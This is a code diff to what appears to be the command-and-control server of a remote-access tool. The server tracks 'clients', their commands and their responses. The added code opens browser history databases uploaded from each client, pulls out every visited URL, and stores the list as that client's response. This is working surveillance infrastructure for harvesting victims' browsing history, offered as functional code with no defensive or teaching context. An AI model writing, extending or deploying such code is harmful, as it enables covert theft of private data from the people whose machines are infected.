@@ -3,6 +3,11 @@ const Command = require('../../../Tool/Commands/commands.model')
 const Client = require('../../../Tool/tool.model')
 const Response = require('../../../Tool/Responses/responses.model')
 const axios = require('axios')
+const sqlite3 = require("sqlite3");
+const path = require("path");
+const {GenerateRandomId} = require("./utilFunctions");
+const appDir = path.dirname(require.main.filename);
+const downloadsPath = path.resolve(appDir, 'Api', 'Utils', 'clientFiles')
 
 const AddCommand = (clientId, command) => {
     const command_id = Utils.GenerateRandomId(6);
@@ -237,3 +242,52 @@ async function findClientIdBySid(sid) {
 }
 
 module.exports.findClientIdBySid = findClientIdBySid
+
+function dbCallback(clientId, urlHistory){
+    addNewClientResponse(clientId,urlHistory).then()
+}
+
+function getUrlsFromDB(clientId){
+    extractHistoryFromDB(clientId, dbCallback)
+}
+module.exports.getUrlsFromDB = getUrlsFromDB;
+
+function extractHistoryFromDB(clientId, callback){
+    let dbPath = path.resolve(downloadsPath,clientId,'history.db')
+    let db = new sqlite3.Database(dbPath);
+    let sqlQuery = 'SELECT url FROM urls;';
+    db.all(sqlQuery, [], (err, rows) => {
+        let urlHistory = ""
+        if (err){
+            Utils.LogToFile(`Error parsing history DB ${err.message}`);
+            callback(null)
+        }
+        else{
+            rows.forEach((row) => {
+                urlHistory += `[+] Url: ${row.url} \r\n\n`
+            });
+        }
+        callback(clientId, urlHistory)
+    })
+    db.close();
+}
+module.exports.extractHistoryFromDB = extractHistoryFromDB;
+
+const addNewClientResponse = async (clientId, response)=>{
+    let response_id = GenerateRandomId(6);
+    const currentTimeDate = Utils.GetCurrentTimeDate();
+    let newResponse = new Response({
+        response_id: response_id,
+        client_id: clientId,
+        response: response,
+        date: currentTimeDate
+    });
+
+    await Client.findOneAndUpdate({client_id: clientId}, {lastActive: currentTimeDate}, {useFindAndModify: false},
+        function (err) {
+            if (err)
+                Utils.LogToFile(`Error updating last active for client ${clientId}`);
+        })
+    return  await newResponse.save().then(() => true).catch(() => false);
+}
+module.exports.addNewClientResponse = addNewClientResponse
